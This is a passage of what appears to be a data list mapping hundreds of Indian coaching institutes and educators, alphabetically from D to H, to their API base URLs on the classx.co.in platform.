        {"name": "Dhyeyinstitute", "api": "https://dhyeyinstituteapi.classx.co.in"},
        {"name": "Dhyeyliveapplication", "api": "https://dhyeyliveapplicationapi.classx.co.in"},
        {"name": "Diacmpscfullcourses", "api": "https://diacmpscfullcoursesapi.classx.co.in"},
        {"name": "Dictionenglishclasses", "api": "https://dictionenglishclassesapi.classx.co.in"},
        {"name": "Digicateias", "api": "https://digicateiasapi.classx.co.in"},
        {"name": "Digilearn", "api": "https://digilearnapi.classx.co.in"},
        {"name": "Diginest", "api": "https://diginestapi.classx.co.in"},
        {"name": "Digitech", "api": "https://digitechapi.classx.co.in"},
        {"name": "Digvijaysirgs", "api": "https://digvijaysirgsapi.classx.co.in"},
        {"name": "Dikshantias", "api": "https://dikshantiasapi.classx.co.in"},
        {"name": "Diligentsscian", "api": "https://diligentsscianapi.classx.co.in"},
        {"name": "Dilipkhatekar", "api": "https://dilipkhatekarapi.classx.co.in"},
        {"name": "Dimplekaushikenglishclasses", "api": "https://dimplekaushikenglishclassesapi.classx.co.in"},
        {"name": "Dineshacademy20", "api": "https://dineshacademyapi.classx.co.in"},
        {"name": "Directionacademy", "api": "https://directionacademyapi.classx.co.in"},
        {"name": "Directionrojgaracademy", "api": "https://directionrojgaracademyapi.classx.co.in"},
        {"name": "Discoveryiasacademy", "api": "https://discoveryiasacademyapi.classx.co.in"},
        {"name": "Dishaacademy", "api": "https://dishaacademyapi.classx.co.in"},
        {"name": "Dishaonlineclasses", "api": "https://dishaonlineclassesapi.classx.co.in"},
        {"name": "Divijatutorials", "api": "https://divijatutorialsapi.classx.co.in"},
        {"name": "Divinestudy", "api": "https://divinestudyapi.classx.co.in"},
        {"name": "Divyadrishticlasses", "api": "https://divyadrishticlassesapi.classx.co.in"},
        {"name": "Dixitsir", "api": "https://dixitsirapi.classx.co.in"},
        {"name": "Djmcforyou", "api": "https://djmcforyouapi.classx.co.in"},
        {"name": "Dkshiksha", "api": "https://dkshikshaapi.classx.co.in"},
        {"name": "Dnanursing", "api": "https://dnanursingapi.classx.co.in"},
        {"name": "Dnyanadeepacademypune", "api": "https://dnyanadeepacademypuneapi.classx.co.in"},
        {"name": "Dnyanaiacademy", "api": "https://dnyanaiacademyapi.classx.co.in"},
        {"name": "Dnyanankuracademypune", "api": "https://dnyanankuracademypuneapi.classx.co.in"},
        {"name": "Dnyanarnavonlineacademy", "api": "https://dnyanarnavonlineacademyapi.classx.co.in"},
        {"name": "Dnyandeepallin1", "api": "https://dnyandeepallapi.classx.co.in"},
        {"name": "Dnyandeepwallah", "api": "https://dnyandeepwallahapi.classx.co.in"},
        {"name": "Dnyaneshwarpatilsgurukulprabodhinipune", "api": "https://dnyaneshwarpatilgurukulprabodhiniapi.classx.co.in"},
        {"name": "Dnyanpeethacademyamravati", "api": "https://dnyanpeethacademyamravatiapi.classx.co.in"},
        {"name": "Dnyanrajacademy", "api": "https://dnyanrajacademyapi.classx.co.in"},
        {"name": "Dnyanvisharadbykamlakarsir", "api": "https://dnyanvisharadkamlakarsirapi.classx.co.in"},
        {"name": "Dnyndeepacademyambajogai", "api": "https://dnyndeepacademyambajogaiapi.classx.co.in"},
        {"name": "Dobhaifreepadhai", "api": "https://dobhaifreepadhaiapi.classx.co.in"},
        {"name": "Dobook", "api": "https://dobookapi.classx.co.in"},
        {"name": "Doeduadphycinstitute", "api": "https://doeduadphycinstituteapi.classx.co.in"},
        {"name": "Doonlawmentor", "api": "https://doonlawmentorapi.classx.co.in"},
        {"name": "Drajayyawaleacademy", "api": "https://drajayyawaleacademyapi.classx.co.in"},
        {"name": "Dramarjagtap", "api": "https://dramarjagtapapi.classx.co.in"},
        {"name": "Dramitsias", "api": "https://dramitsiasapi.classx.co.in"},
        {"name": "Dranandmani", "api": "https://dranandmaniapi.classx.co.in"},
        {"name": "Drdkkaushiksenglish", "api": "https://drdkkaushikenglishapi.classx.co.in"},
        {"name": "Dreamexam", "api": "https://dreamexamapi.classx.co.in"},
        {"name": "Dreamkhaki", "api": "https://dreamkhakiapi.classx.co.in"},
        {"name": "Dreamsewakiasthelearningapp", "api": "https://dreamsewakiasapi.classx.co.in"},
        {"name": "Dreamteam", "api": "https://dreamteamapi.classx.co.in"},
        {"name": "Dreducationofficial", "api": "https://dreducationofficialapi.classx.co.in"},
        {"name": "Drgoswamiacademy", "api": "https://goswamiacademyapi.classx.co.in"},
        {"name": "Drgreenagroclassesudaipur", "api": "https://drgreenagroclassesudaipurapi.classx.co.in"},
        {"name": "Drishta", "api": "https://drishtaapi.classx.co.in"},
        {"name": "Drishtipedia", "api": "https://drishtipediaapi.classx.co.in"},
        {"name": "Dronacharyaacademybyudaysir", "api": "https://dronacharyaacademyudaysirapi.classx.co.in"},
        {"name": "Drsachin", "api": "https://drsachinbhaskesshardaacademyapi.classx.co.in"},
        {"name": "Drsachinkapur", "api": "https://drsachinkapurapi.classx.co.in"},
        {"name": "Drsahilclasses", "api": "https://drsahilclassesapi.classx.co.in"},
        {"name": "Drsanjayatrieducation", "api": "https://drsanjayatrieducationapi.classx.co.in"},
        {"name": "Drsgoswamiclasses", "api": "https://drsgoswamiclassesapi.classx.co.in"},
        {"name": "Dryokesharul", "api": "https://dryokesharulapi.classx.co.in"},
        {"name": "Dslclassesjind", "api": "https://dslclassesjindapi.classx.co.in"},
        {"name": "Dteach", "api": "https://dteachapi.classx.co.in"},
        {"name": "Dts", "api": "https://dtsapi.classx.co.in"},
        {"name": "Dufferadda", "api": "https://dufferaddaapi.classx.co.in"},
        {"name": "Dvstechgovtjobskillprep", "api": "https://dvstechgovtjobskillprepapi.classx.co.in"},
        {"name": "Dyasvardicha", "api": "https://dyasvardichaapi.classx.co.in"},
        {"name": "Dynamiccoachingcentre", "api": "https://dynamiccoachingcentreapi.classx.co.in"},
        {"name": "Dzklive", "api": "https://dzkliveapi.classx.co.in"},
        {"name": "E1Coaching", "api": "https://e1coachingcenterapi.classx.co.in"},
        {"name": "E2Academy", "api": "https://e2academyapi.classx.co.in"},
        {"name": "E3Lacademy", "api": "https://e3lacademyapi.classx.co.in"},
        {"name": "Eabhyasu", "api": "https://eabhyasuapi.classx.co.in"},
        {"name": "Easy2Learning20", "api": "https://easy2learning2api.classx.co.in"},
        {"name": "Easyagriculture", "api": "https://easyagricultureapi.classx.co.in"},
        {"name": "Easyenglish", "api": "https://easyenglishapi.classx.co.in"},
        {"name": "Easyreasoningclassesbyrahulsir", "api": "https://easyreasoningclassesrahulsirapi.classx.co.in"},
        {"name": "Ebsexcellentbookstore", "api": "https://excellentbookstoreapi.classx.co.in"},
        {"name": "Ecacademy", "api": "https://ecacademyapi.classx.co.in"},
        {"name": "Ecomath", "api": "https://ecomathapi.classx.co.in"},
        {"name": "Economicsbyshrikantkalaskar", "api": "https://economicsshrikantkalaskarapi.classx.co.in"},
        {"name": "Economicspreparation", "api": "https://economicspreparationapi.classx.co.in"},
        {"name": "Economybydhananjaymate", "api": "https://dhananjaymatesswarajyaacademyapi.classx.co.in"},
        {"name": "Ecopathshala", "api": "https://ecopathshalaapi.classx.co.in"},
        {"name": "Ecotutorialsbymandeep", "api": "https://ecotutorialsmandeepapi.classx.co.in"},
        {"name": "Edgeias", "api": "https://edgeiasapi.classx.co.in"},
        {"name": "Edu4Tech", "api": "https://edu4techapi.classx.co.in"},
        {"name": "Educaptain", "api": "https://educaptainapi.classx.co.in"},
        {"name": "Educateindia", "api": "https://educateindiaapi.classx.co.in"},
        {"name": "Educationaddaplus", "api": "https://educationaddaplusapi.classx.co.in"},
        {"name": "Educationgalaxy", "api": "https://educationgalaxyapi.classx.co.in"},
        {"name": "Educationpathshala", "api": "https://educationpathshalaapi.classx.co.in"},
        {"name": "Educationpointharidwar", "api": "https://educationpointharidwarapi.classx.co.in"},
        {"name": "Educationwithsv", "api": "https://educationsvapi.classx.co.in"},
        {"name": "Educatorsplus", "api": "https://educatorsplusapi.classx.co.in"},
        {"name": "Educracy", "api": "https://educracyapi.classx.co.in"},
        {"name": "Eduexcellence", "api": "https://eduexcellenceapi.classx.co.in"},
        {"name": "Edukrishnaofficial", "api": "https://edukrishnapi.classx.co.in"},
        {"name": "Edukunjprime", "api": "https://edukunjprimeapi.classx.co.in"},
        {"name": "Edulogy", "api": "https://edulogyapi.classx.co.in"},
        {"name": "Edumedhbymahipalsir", "api": "https://edumedhmahipalsirapi.classx.co.in"},
        {"name": "Eduparcham", "api": "https://eduapi.classx.co.in"},
        {"name": "Eduzonin", "api": "https://eduzoninapi.classx.co.in"},
        {"name": "Eeeclive", "api": "https://eeecliveapi.classx.co.in"},
        {"name": "Effectivestudy", "api": "https://effectivestudyapi.classx.co.in"},
        {"name": "Ekalavya", "api": "https://ekalavyaapi.classx.co.in"},
        {"name": "Ekdantamclasses", "api": "https://ekdantamclassesapi.classx.co.in"},
        {"name": "Ekdumbasic", "api": "https://ekdumbasicapi.classx.co.in"},
        {"name": "Ekprayas", "api": "https://ekprayasapi.classx.co.in"},
        {"name": "Elearningstudyadda", "api": "https://elearningstudyaddaapi.classx.co.in"},
        {"name": "Electricaldost", "api": "https://electricaldostapi.classx.co.in"},
        {"name": "Electricaleng", "api": "https://electricenglishapi.classx.co.in"},
        {"name": "Electricalengineeringmcq", "api": "https://electricalengineeringmcqapi.classx.co.in"},
        {"name": "Eliteiasacademy", "api": "https://eliteiasacademyapi.classx.co.in"},
        {"name": "Endeavoracademy", "api": "https://endeavoracademyapi.classx.co.in"},
        {"name": "Engineeringfunda", "api": "https://engineeringfundaapi.classx.co.in"},
        {"name": "Engineersgroup", "api": "https://engineersgroupapi.classx.co.in"},
        {"name": "Engineerswala", "api": "https://engineerswalaapi.classx.co.in"},
        {"name": "Engineerswaveinstitute", "api": "https://engineerswaveinstituteapi.classx.co.in"},
        {"name": "Englishbyamysir", "api": "https://englishbyamysirapi.classx.co.in"},
        {"name": "Englishbydksir", "api": "https://englishdksirapi.classx.co.in"},
        {"name": "Englishbyjaisir", "api": "https://englishjaisirapi.classx.co.in"},
        {"name": "Englishbyroshansir", "api": "https://englishroshansirapi.classx.co.in"},
        {"name": "Englishbyvijender", "api": "https://englishvijenderapi.classx.co.in"},
        {"name": "Englishdiscovery", "api": "https://englishdiscoveryapi.classx.co.in"},
        {"name": "Englishdriveonline", "api": "https://englishdriveonlineapi.classx.co.in"},
        {"name": "Englishforall", "api": "https://englishforallapi.classx.co.in"},
        {"name": "Englishfromzero", "api": "https://englishfromzeroapi.classx.co.in"},
        {"name": "Englishgrammarbyrahulaute", "api": "https://englishgrammarrahulauteapi.classx.co.in"},
        {"name": "Englishnotebook", "api": "https://englishnotebookapi.classx.co.in"},
        {"name": "Englishramesh", "api": "https://englishrameshapi.classx.co.in"},
        {"name": "Englishwithashutoshsir", "api": "https://englishashutoshsirapi.classx.co.in"},
        {"name": "Englishwithbalasaheb", "api": "https://englishwithbalasahebapi.classx.co.in"},
        {"name": "Englishwithheman", "api": "https://englishwithhemantapi.classx.co.in"},
        {"name": "Englishwithnitinsir", "api": "https://englishnitinsirapi.classx.co.in"},
        {"name": "Englishwithrajesh", "api": "https://englishrajeshapi.classx.co.in"},
        {"name": "Englishwithsanjeevsir", "api": "https://englishsanjeevsirapi.classx.co.in"},
        {"name": "Englishworld", "api": "https://englishworldapi.classx.co.in"},
        {"name": "Englisio", "api": "https://englisioapi.classx.co.in"},
        {"name": "Envisionjeeneet", "api": "https://envisionjeeneetapi.classx.co.in"},
        {"name": "Erdr", "api": "https://erdrapi.classx.co.in"},
        {"name": "Ervkguptacampusexammantra", "api": "https://ervkguptacampusapi.classx.co.in"},
        {"name": "Et", "api": "https://etapi.classx.co.in"},
        {"name": "Etcenglishtrainingcentre", "api": "https://englishtrainingcentreapi.classx.co.in"},
        {"name": "Etechpathashala", "api": "https://etechpathashalaapi.classx.co.in"},
        {"name": "Etestseriestestbook", "api": "https://etestseriescompetitiveexamstestbookapi.classx.co.in"},
        {"name": "Ethicaedutech", "api": "https://ethicaedutechapi.classx.co.in"},
        {"name": "Eurekaacademylive", "api": "https://eurekaacademyliveapi.classx.co.in"},
        {"name": "Exam", "api": "https://examjunctionapi.classx.co.in"},
        {"name": "Exama2Z", "api": "https://exama2zapi.classx.co.in"},
        {"name": "Examadda360", "api": "https://examadda360api.classx.co.in"},
        {"name": "Examania", "api": "https://examaniaapi.classx.co.in"},
        {"name": "Examaspirants", "api": "https://examaspirantsapi.classx.co.in"},
        {"name": "Examboardhsscssccet", "api": "https://examboardhsscssccetapi.classx.co.in"},
        {"name": "Exambulls9", "api": "https://exambulls9api.classx.co.in"},
        {"name": "Examchase", "api": "https://examchaseapi.classx.co.in"},
        {"name": "Examchip", "api": "https://examchipapi.classx.co.in"},
        {"name": "Examcoach", "api": "https://examcoachapi.classx.co.in"},
        {"name": "Examdost", "api": "https://examdostapi.classx.co.in"},
        {"name": "Examdrishti", "api": "https://examdrishtiapi.classx.co.in"},
        {"name": "Exameducation", "api": "https://exameducationapi.classx.co.in"},
        {"name": "Exameducator", "api": "https://exameducatorapi.classx.co.in"},
        {"name": "Examfactacademy", "api": "https://examfactacademyapi.classx.co.in"},
        {"name": "Examfirst", "api": "https://englishallinoneapi.classx.co.in"},
        {"name": "Examgravity", "api": "https://examgravityapi.classx.co.in"},
        {"name": "Examguideapp", "api": "https://examguideappapi.classx.co.in"},
        {"name": "Examguruji", "api": "https://examgurujiapi.classx.co.in"},
        {"name": "Examgurutipsandtricks", "api": "https://examgurutipstricksapi.classx.co.in"},
        {"name": "Examhelpline", "api": "https://examhelplineapi.classx.co.in"},
        {"name": "Examindia", "api": "https://examindiaapi.classx.co.in"},
        {"name": "Examjn", "api": "https://examjnapi.classx.co.in"},
        {"name": "Exammanch", "api": "https://exammanchapi.classx.co.in"},
        {"name": "Exammantra", "api": "https://exammantraapi.classx.co.in"},
        {"name": "Exammaster", "api": "https://exammasterapi.classx.co.in"},
        {"name": "Examnagari", "api": "https://examnagariapi.classx.co.in"},
        {"name": "Examnity", "api": "https://examnityapi.classx.co.in"},
        {"name": "Examo", "api": "https://examoapi.classx.co.in"},
        {"name": "Exampathikclasses", "api": "https://exampathikclassesapi.classx.co.in"},
        {"name": "Exampoll", "api": "https://exampollapi.classx.co.in"},
        {"name": "Examprep", "api": "https://examprepapi.classx.co.in"},
        {"name": "Examprodigital", "api": "https://examprodigitalapi.classx.co.in"},
        {"name": "Exampunjabi", "api": "https://exampunjabiapi.classx.co.in"},
        {"name": "Exampur", "api": "https://exampurappapi.classx.co.in"},
        {"name": "Examqualifier", "api": "https://examqualifierapi.classx.co.in"},
        {"name": "Examscalegovtjobsexamprep", "api": "https://examscalegovtjobsexamprepapi.classx.co.in"},
        {"name": "Examscentre247", "api": "https://examscentre247api.classx.co.in"},
        {"name": "Examsquadprofessionalhub", "api": "https://examsquadprofessionalhubapi.classx.co.in"},
        {"name": "Examsrank", "api": "https://examsrankapi.classx.co.in"},
        {"name": "Examstrong", "api": "https://examstrongapi.classx.co.in"},
        {"name": "Examstudyengineering", "api": "https://examstudyengineeringapi.classx.co.in"},
        {"name": "Examtarkash", "api": "https://examtarkashapi.classx.co.in"},
        {"name": "Examtopper", "api": "https://examtopperappapi.classx.co.in"},
        {"name": "Examtopper9", "api": "https://examtopper9api.classx.co.in"},
        {"name": "Examtricks", "api": "https://examtricksapi.classx.co.in"},
        {"name": "Examvidhi", "api": "https://examvidhiapi.classx.co.in"},
        {"name": "Examwadi", "api": "https://examwadiapi.classx.co.in"},
        {"name": "Examyug24", "api": "https://examyug24api.classx.co.in"},
        {"name": "Examzila", "api": "https://examzilaapi.classx.co.in"},
        {"name": "Examzygovtjobsexamprep", "api": "https://examzygovtjobsexamprepapi.classx.co.in"},
        {"name": "Excellencestudy", "api": "https://excellencestudyapi.classx.co.in"},
        {"name": "Expertphysics20", "api": "https://expertphysicsapi.classx.co.in"},
        {"name": "Exploringgoals", "api": "https://exploringgoalsapi.classx.co.in"},
        {"name": "Expresstrainingservices", "api": "https://expresstrainingservicesapi.classx.co.in"},
        {"name": "Faibs", "api": "https://fabisinstituteofmathematicsapi.classx.co.in"},
        {"name": "Farmeducation", "api": "https://farmeducationapi.classx.co.in"},
        {"name": "Farmeducon", "api": "https://farmeduconapi.classx.co.in"},
        {"name": "Fastrackmathsreasoning", "api": "https://fastrackandmathsreasoningapi.classx.co.in"},
        {"name": "Fatehkar", "api": "https://fatehkarapi.classx.co.in"},
        {"name": "Feelthephysics", "api": "https://feelphysicsapi.classx.co.in"},
        {"name": "Finaltouchacademy", "api": "https://finaltouchacademyapi.classx.co.in"},
        {"name": "Fipinactive", "api": "https://funpathshalaapi.classx.co.in"},
        {"name": "Fittiti", "api": "https://fittitiapi.classx.co.in"},
        {"name": "Focusacademy", "api": "https://focusacademyapi.classx.co.in"},
        {"name": "Fojicircle", "api": "https://fojicircleapi.classx.co.in"},
        {"name": "Forcegalaxy", "api": "https://forcegalaxyapi.classx.co.in"},
        {"name": "Formulator", "api": "https://formulatorapi.classx.co.in"},
        {"name": "Foundationlearning", "api": "https://foundationlearningapi.classx.co.in"},
        {"name": "Foundationmathsexam", "api": "https://foundationmathsexamapi.classx.co.in"},
        {"name": "Fourhandsedusys", "api": "https://fourhandsedusysapi.classx.co.in"},
        {"name": "Freejobsinformation", "api": "https://freejobsinformationapi.classx.co.in"},
        {"name": "Freetest", "api": "https://freetestapi.classx.co.in"},
        {"name": "Freshernowtelugu", "api": "https://freshernowteluguapi.classx.co.in"},
        {"name": "Ftiiandsrfti", "api": "https://ftiiandsrftiapi.classx.co.in"},
        {"name": "Fullscore", "api": "https://fullscoreapi.classx.co.in"},
        {"name": "Fume", "api": "https://fumeappapi.classx.co.in"},
        {"name": "Funinpathsala", "api": "https://fipapi.classx.co.in"},
        {"name": "Futurekulcollege", "api": "https://futurekulcollegeapi.classx.co.in"},
        {"name": "Futurerojgar", "api": "https://futurerojgarapi.classx.co.in"},
        {"name": "Futurewillacademy", "api": "https://futurewillacademyapi.classx.co.in"},
        {"name": "G9Studybypatelsir", "api": "https://g9studypatelsirapi.classx.co.in"},
        {"name": "Gabypiyushsir", "api": "https://gabypiyushsirapi.classx.co.in"},
        {"name": "Gadgetsonemalayalam", "api": "https://gadgetsonemalayalamapi.classx.co.in"},
        {"name": "Gaganpratapmaths", "api": "https://gaganpratapmathsapi.classx.co.in"},
        {"name": "Galaxyonlineworld", "api": "https://galaxyonlineworldapi.classx.co.in"},
        {"name": "Gamepgapp", "api": "https://gamepgappapi.classx.co.in"},
        {"name": "Gammyanirdesha", "api": "https://gammyanirdeshaapi.classx.co.in"},
        {"name": "Ganeshaglobal", "api": "https://ganeshaglobalapi.classx.co.in"},
        {"name": "Ganeshkadsacademy", "api": "https://ganeshkadacademyapi.classx.co.in"},
        {"name": "Ganeshkawaneacademy", "api": "https://ganeshkawaneacademyapi.classx.co.in"},
        {"name": "Ganpatgurukulphulera", "api": "https://ganpatgurukulphuleraapi.classx.co.in"},
        {"name": "Garvitpublications", "api": "https://garvitpublicationsapi.classx.co.in"},
        {"name": "Gateacademyvod", "api": "https://gateacademyvodapi.classx.co.in"},
        {"name": "Gatecsebyamitkhurana", "api": "https://gatecseamitkhuranaapi.classx.co.in"},
        {"name": "Gauravjunction", "api": "https://gauravjunctionapi.classx.co.in"},
        {"name": "Gauravkaushal", "api": "https://gauravkaushalapi.classx.co.in"},
        {"name": "Gauravmadhu", "api": "https://gauravmadhuapi.classx.co.in"},
        {"name": "Gauravsuthar", "api": "https://gauravsutharapi.classx.co.in"},
        {"name": "Gaurshorthandclasses", "api": "https://gaurshorthandclassesapi.classx.co.in"},
        {"name": "Gccampusbygcjakhar", "api": "https://gccampusgcjakharapi.classx.co.in"},
        {"name": "Gccniosclasses", "api": "https://gccniosclassesapi.classx.co.in"},
        {"name": "Gcentrick", "api": "https://gcentrickapi.classx.co.in"},
        {"name": "Gchemclasses", "api": "https://gchemclassesapi.classx.co.in"},
        {"name": "Gdcacademy", "api": "https://gdcacademyapi.classx.co.in"},
        {"name": "Gearinstitute", "api": "https://gearinstituteapi.classx.co.in"},
        {"name": "Geetanjaliras", "api": "https://geetanjalirasapi.classx.co.in"},
        {"name": "Genique", "api": "https://geniqueapi.classx.co.in"},
        {"name": "Geniuselearning", "api": "https://geniuselearningapi.classx.co.in"},
        {"name": "Geniusias", "api": "https://geniusiasapi.classx.co.in"},
        {"name": "Geniusinstitute", "api": "https://geniusinstituteapi.classx.co.in"},
        {"name": "Geniusmaker", "api": "https://geniusmakerapi.classx.co.in"},
        {"name": "Geniusmaths", "api": "https://geniusmathsapi.classx.co.in"},
        {"name": "Geniusstudycircle", "api": "https://geniusstudycircleapi.classx.co.in"},
        {"name": "Geniusvidyarthi", "api": "https://geniusvidyarthiapi.classx.co.in"},
        {"name": "Gennextcareeracademy", "api": "https://gennextcareeracademyapi.classx.co.in"},
        {"name": "Genomicmedical", "api": "https://genomicmedicalapi.teachx.in"},
        {"name": "Genomicmedicalandnursing", "api": "https://genomicmedicalapi.classx.co.in"},
        {"name": "Geobyavdhutsir", "api": "https://geoavbhutsirapi.classx.co.in"},
        {"name": "Geographyacademy", "api": "https://geographyacademyapi.classx.co.in"},
        {"name": "Geographyandagriculturebypvsir", "api": "https://geographyagriculturepvsirapi.classx.co.in"},
        {"name": "Geographybydrvikaschoudhary", "api": "https://geographyvikaschoudharyapi.classx.co.in"},
        {"name": "Geographybyjanaiahsir", "api": "https://geographyjanaiahsirapi.classx.co.in"},
        {"name": "Geographybysachinshinde", "api": "https://geographysachinshindeapi.classx.co.in"},
        {"name": "Geographybyyogeshsir", "api": "https://geographyyogeshsirapi.classx.co.in"},
        {"name": "Geologywala", "api": "https://geologywalaapi.classx.co.in"},
        {"name": "Geopixelacademy", "api": "https://geopixelacademyapi.classx.co.in"},
        {"name": "Getapt", "api": "https://getaptapi.classx.co.in"},
        {"name": "Ggtfit", "api": "https://ggtfitapi.classx.co.in"},
        {"name": "Gkbysatishshindelatur", "api": "https://gksatishshindelaturapi.classx.co.in"},
        {"name": "Gkcafe", "api": "https://gkcafeapi.classx.co.in"},
        {"name": "Gkgsmasti", "api": "https://gkgsmastiapi.classx.co.in"},
        {"name": "Gkhouseexams", "api": "https://gkhouseexamsapi.classx.co.in"},
        {"name": "Gkmathsreasoning", "api": "https://gkmathsreasoningapi.classx.co.in"},
        {"name": "Gknagri", "api": "https://gknagriapi.classx.co.in"},
        {"name": "Gksacademyudaipur", "api": "https://gksacademyudaipurapi.classx.co.in"},
        {"name": "Gkstudygovtexamspreparation", "api": "https://gkstudygovtexamspreparationapi.classx.co.in"},
        {"name": "Gkwalesonusir", "api": "https://gkwalesonusirapi.classx.co.in"},
        {"name": "Gkwithvikassuthar", "api": "https://gkvikassutharapi.classx.co.in"},
        {"name": "Globalclasses", "api": "https://globalclassesapi.classx.co.in"},
        {"name": "Gmacademympsc", "api": "https://gmacademympscapi.classx.co.in"},
        {"name": "Gmade", "api": "https://gmadeapi.classx.co.in"},
        {"name": "Gnceducare", "api": "https://gnceducareapi.classx.co.in"},
        {"name": "Goalinstitute", "api": "https://goalinstituteapi.classx.co.in"},
        {"name": "Goalyaan", "api": "https://goalyaanapi.classx.co.in"},
        {"name": "Goforeducation", "api": "https://goforeducationapi.classx.co.in"},
        {"name": "Gogreen", "api": "https://gogreenapi.classx.co.in"},
        {"name": "Goldencareer", "api": "https://goldencareersapi.classx.co.in"},
        {"name": "Gonagannareddypublications", "api": "https://gonagannareddypublicationsapi.classx.co.in"},
        {"name": "Gonitchorcha", "api": "https://gonitchorchaapi.classx.co.in"},
        {"name": "Gopalgirisirmathsreasoning", "api": "https://gopalgirisirmathsreasoningapi.classx.co.in"},
        {"name": "Govidya", "api": "https://govidyaapi.classx.co.in"},
        {"name": "Govtjobs", "api": "https://govtjobswalaapi.classx.co.in"},
        {"name": "Gradeupstudy", "api": "https://gradeupstudyapi.classx.co.in"},
        {"name": "Greatconcept", "api": "https://greatconceptapi.classx.co.in"},
        {"name": "Greatgeniuses", "api": "https://greatgeniusesapi.classx.co.in"},
        {"name": "Greenboard", "api": "https://greenboardapi.classx.co.in"},
        {"name": "Groskill", "api": "https://groskillapi.classx.co.in"},
        {"name": "Growacademy", "api": "https://growacademyapi.classx.co.in"},
        {"name": "Gsbymanojsir", "api": "https://gsmanojsirapi.classx.co.in"},
        {"name": "Gsbyuttamgore", "api": "https://gsuttamgoreapi.classx.co.in"},
        {"name": "Gsforum", "api": "https://gsforumapi.classx.co.in"},
        {"name": "Gsforumofficial", "api": "https://gsforumofficialapi.classx.co.in"},
        {"name": "Gsmedicalacademy", "api": "https://gsmedicalacademyapi.classx.co.in"},
        {"name": "Gsmlive", "api": "https://gsmliveapi.classx.co.in"},
        {"name": "Gsplanetinstitute", "api": "https://gsplanetinstituteapi.classx.co.in"},
        {"name": "Gswithsandeeptyagi", "api": "https://gswithsandeeptyagiapi.classx.co.in"},
        {"name": "Gsworldonline", "api": "https://gsworldonlineapi.classx.co.in"},
        {"name": "Gtdefenceacademy", "api": "https://gtdefenceacademyapi.classx.co.in"},
        {"name": "Guardeer", "api": "https://guardeerapi.classx.co.in"},
        {"name": "Gulshanbeldarsacademy", "api": "https://gulshanbeldarsacademyapi.classx.co.in"},
        {"name": "Gupteshsiryudhhabhyasiasacademy", "api": "https://gupteshsiryudhhabhyasiasacademyapi.classx.co.in"},
        {"name": "Guruclassesjaipur", "api": "https://guruclassesjaipurapi.classx.co.in"},
        {"name": "Gurudakshina", "api": "https://gurudakshinaapi.classx.co.in"},
        {"name": "Gurueducationhub", "api": "https://gurueducationhubapi.classx.co.in"},
        {"name": "Guruelearning", "api": "https://guruonlineclassesapi.classx.co.in"},
        {"name": "Gurujikags", "api": "https://gurujikagsapi.classx.co.in"},
        {"name": "Gurujiworldexamstudy", "api": "https://gurujiworldexamstudyapi.classx.co.in"},
        {"name": "Gurukulacademy", "api": "https://gurukulacademyapi.classx.co.in"},
        {"name": "Gurukulaenglishtestseries", "api": "https://gurukulaenglishtestseriesapi.classx.co.in"},
        {"name": "Gurukularmy", "api": "https://gurukularmyapi.classx.co.in"},
        {"name": "Gurukulplus", "api": "https://gurukulplusapi.classx.co.in"},
        {"name": "Gurukulprabhodhiniinstitute", "api": "https://gurukulprabodhinipuneapi.classx.co.in"},
        {"name": "Gururehman", "api": "https://gururehmanapi.classx.co.in"},
        {"name": "Gururehmansirliveclasses", "api": "https://gururehmansirliveclassesapi.classx.co.in"},
        {"name": "Gurushalateachersacademy", "api": "https://gurushalateachersacademyapi.classx.co.in"},
        {"name": "Gvkaksha", "api": "https://gvkakshaapi.classx.co.in"},
        {"name": "Gyanaj", "api": "https://gyanajapi.classx.co.in"},
        {"name": "Gyanbindu", "api": "https://gyanbinduapi.appx.co.in"},
        {"name": "Gyanbindu", "api": "https://gyanbinduapi.classx.co.in"},
        {"name": "Gyanbook", "api": "https://gyanbookapi.classx.co.in"},
        {"name": "Gyanbooster", "api": "https://gyanboosterapi.classx.co.in"},
        {"name": "Gyangangaofficial", "api": "https://gyangangaofficialapi.classx.co.in"},
        {"name": "Gyanhub", "api": "https://gyanhubapi.classx.co.in"},
        {"name": "Gyanias", "api": "https://gyaniasapi.classx.co.in"},
        {"name": "Gyanjyoti", "api": "https://gyanjyotiapi.classx.co.in"},
        {"name": "Gyankunjacademy", "api": "https://gyankunjacademyapi.classx.co.in"},
        {"name": "Gyankurfoundation", "api": "https://gyankurfoundationapi.classx.co.in"},
        {"name": "Gyanmadeias", "api": "https://gyanmadeiasapi.classx.co.in"},
        {"name": "Gyannidhiclasses", "api": "https://gyannidhiclassesapi.classx.co.in"},
        {"name": "Gyanodaykeguruji", "api": "https://gyanodaygurujiapi.classx.co.in"},
        {"name": "Gyansootra", "api": "https://gyansootraapi.classx.co.in"},
        {"name": "Gyansthalicommerceclasses", "api": "https://gyansthalicommerceclassesapi.classx.co.in"},
        {"name": "Gyanxp", "api": "https://gyanxpapi.classx.co.in"},
        {"name": "H2Sonlineclasses", "api": "https://h2sonlineclassesapi.classx.co.in"},
        {"name": "Haacademy", "api": "https://haacademyapi.classx.co.in"},
        {"name": "Hadacompetition", "api": "https://hadacompetitionapi.classx.co.in"},
        {"name": "Hamaraplatformlearningapp", "api": "https://hamaraplatformlearningappapi.classx.co.in"},
        {"name": "Hamariacademyofficial", "api": "https://hamariacademyofficialapi.classx.co.in"},
        {"name": "Hamaripariksha", "api": "https://hamariparikshaapi.classx.co.in"},
        {"name": "Handbookacademy", "api": "https://handbookacademyapi.classx.co.in"},
        {"name": "Hanumanshindesprashasancareeracademy", "api": "https://hanumanshindesprashasancareeracademyapi.classx.co.in"},
        {"name": "Happyacademy", "api": "https://happyacademyapi.classx.co.in"},
        {"name": "Harishtiwariclasses", "api": "https://harishtiwariclassesapi.classx.co.in"},
        {"name": "Harkiratsingh", "api": "https://harkiratapi.classx.co.in"},
        {"name": "Harshithinstitute", "api": "https://harshithinstituteapi.classx.co.in"},
        {"name": "Haryanajobcity", "api": "https://haryanajobcityapi.classx.co.in"},
        {"name": "Hcverma", "api": "https://hcvermaapi.classx.co.in"},
        {"name": "Hellorajasthan", "api": "https://hellorajasthanapi.classx.co.in"},
        {"name": "Hellosahitya", "api": "https://hellosahityaapi.classx.co.in"},
        {"name": "Hellosirexampreparationapp", "api": "https://hellosirexampreparationapi.classx.co.in"},
        {"name": "Helloworldbyprince", "api": "https://helloworldprinceapi.classx.co.in"},
        {"name": "Hexamathsbyranjitsinhrajput", "api": "https://hexamathsranjitsinhrajputapi.classx.co.in"},
        {"name": "Hgaurclassespro", "api": "https://hgaurclassesproapi.classx.co.in"},
        {"name": "Highlandparamedicalinstitute", "api": "https://highlandparamedicalinstituteapi.classx.co.in"},
